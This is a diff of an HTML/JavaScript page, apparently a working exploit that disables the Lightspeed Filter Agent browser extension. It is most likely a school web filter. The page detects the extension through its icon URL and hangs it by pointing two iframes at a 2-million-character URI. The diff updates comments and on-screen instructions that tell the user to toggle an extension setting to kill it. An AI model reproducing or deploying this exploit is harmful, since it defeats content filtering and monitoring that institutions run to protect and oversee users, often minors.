@@ -69,7 +69,7 @@
     	}
     </style>
     <script>
-	function checkForExtension() {
+	function checkForExtension() { // checks for if u have lightspeed installed
             const extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
             fetch(extURL)
                 .then(response => {
@@ -140,7 +140,7 @@
     	    document.body.appendChild(extFrame1);
 	    document.body.appendChild(extFrame2);
     
-	    setTimeout(function() {
+	    setTimeout(function() { // Exploit function which creates 2 frames pointing to lightspeed's web accessible url and then redirects them to a 2 million digit long URI
     		let killURL = "https://" + "e".repeat(2000000);
     		extFrame1.src = killURL;
     		extFrame2.src = killURL;
@@ -237,7 +237,7 @@
             header.appendChild(x);
 
             const instructions = document.createElement("p");
-            instructions.innerHTML = "Lightspeed has been hanged. To kill it, open the following URL in a new tab and flip the \"Allow access to file URLs\" switch. Then you can close both of these tabs. <br><br> chrome://extensions/?id=adkcpkpghahmbopkjchobieckeoaoeem";
+            instructions.innerHTML = "Lightspeed has been hanged. To kill it, open the following URL in a new tab (don't close this one) and flip the \"Allow access to file URLs\" switch. <br><br> chrome://extensions/?id=adkcpkpghahmbopkjchobieckeoaoeem";
             instructions.style.padding = "15px";
             instructions.style.textAlign = "center";
 
@@ -270,7 +270,7 @@
         	iframe.style.position = "absolute";
         	iframe.style.left = "-9999px"; 
         	iframe.onload = () => {
-            	    instructions.innerHTML = "Lightspeed Filter Agent has been killed.";
+            	    instructions.innerHTML = "Lightspeed Filter Agent has been killed! You can close this tab now.";
         	};
         	document.body.appendChild(iframe);
 
